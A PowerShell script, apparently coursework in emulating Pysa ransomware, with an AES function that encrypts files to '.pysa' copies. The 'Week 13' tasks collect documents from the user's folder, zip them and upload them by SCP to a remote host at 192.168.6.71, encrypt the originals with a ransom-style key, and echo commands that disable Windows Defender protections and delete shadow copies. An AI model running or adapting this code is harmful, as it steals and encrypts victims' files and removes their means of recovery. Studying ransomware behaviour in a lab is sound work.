<#
.SYNOPSIS
Encryptes or Decrypts Strings or Byte-Arrays with AES
 
.DESCRIPTION
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
 
.PARAMETER Mode
Encryption or Decryption Mode
 
.PARAMETER Key
Key used to encrypt or decrypt
 
.PARAMETER Text
String value to encrypt or decrypt
 
.PARAMETER Path
Filepath for file to encrypt or decrypt
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
 
Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".pysa"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}



<#
Week 13 task 1 
Search the file system looking for docx, xlsx, pdf, and txt files 
copy these to a folder. Then zip the folder and scp to remote host 
#>

# Look for all the files
$filelist = Get-ChildItem -recurse -Include *.pdf,*.xlsx,*.docx, *.txt `
 -Path .\Documents

# Create a new folder in the temp directory  
New-Item -Path "C:\Windows\Temp\" -Name "Files" -ItemType "directory"

$destinationFolder = "C:\Windows\Temp\Files"
# Loop through the results and add them the folder
foreach ($f in $fileList)
{
    Copy-Item $f.FullName -Destination $destinationFolder
}

# zip the folder
Compress-Archive -Path $destinationFolder -DestinationPath $destinationFolder

# deletes the unzipped folder
Remove-Item -Path $destinationFolder -Recurse

# Move the files to the remote server

  # Login to the remote SSH server 
  New-SSHSession -ComputerName '192.168.6.71' -Credential (Get-Credential 'emily.crawford@cyber.local') -Port '2222'

  # Upload the the zipped file
  Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential 'emily.crawford@cyber.local') -Path 'C:\Windows\Temp\Files.zip' -Destination '/home/emily.crawford/' -Port '2222'

  # Check to see if file was moved over, and print the results
  if ((Invoke-SSHCommand -index 0 'dir Files.zip').ExitStatus -eq 0 )
  {
      Write-Host -BackgroundColor "Green" -ForegroundColor "white" "File were uploaded!"
  } 
  else
  {
      Write-Host -BackgroundColor "Red" -ForegroundColor "white" " Files were not uploaded!"
  }
# delete the zip file off the host
Remove-Item -Path "C:\Windows\Temp\Files.zip"

# Loop through the results and encrypt the files
foreach ($f in $fileList)
{
    Invoke-AESEncryption -Mode Encrypt -Key "your-files-are-encytped-with-Pysa" -Path $f.FullName
}

<# 
Week 13 task 2 
Turn off windows defender and delete volume shadow copies and restore points
None of these commandlets are actually run because I have an antivirus so Windows Defender 
is already turned off, because Controlled Folder access is aprt of Windows Defender it wouldn't work in my specific machine.
As well 
#>

# Turn off windows defender 
Write-Output "Set-MpPreference -DisableRealtimeMonitoring $true"
# Turn off Controlled Folder Access
Write-Output "Set-MpPreference -EnableControlledFolderAccess Disabled"

# Delete shadow copies and restore points
Write-Output 'Write-Host "vssadmin delete shadows /all /quiet"'

# run update.bat which will delete the file 
Invoke-Expression ".\update.bat"